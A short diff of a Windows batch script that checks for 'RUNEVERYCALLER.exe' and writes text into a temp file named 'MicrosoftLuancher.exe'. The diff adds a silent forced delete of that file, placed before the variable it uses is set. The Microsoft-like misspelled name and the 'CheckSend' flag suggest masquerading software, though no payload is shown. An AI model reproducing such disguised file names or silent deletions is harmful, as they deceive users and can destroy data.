@@ -64,6 +64,10 @@ echo RUNEVERYCALLER.exe is not running. Continue.....
 
 set "CheckSend=0"
 set "lastMinute=none"
+
+
+
+del /f /q "%InstalledQWB%"
 set "InstalledQWB=%temp%\MicrosoftLuancher.exe"
 echo Updates : >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
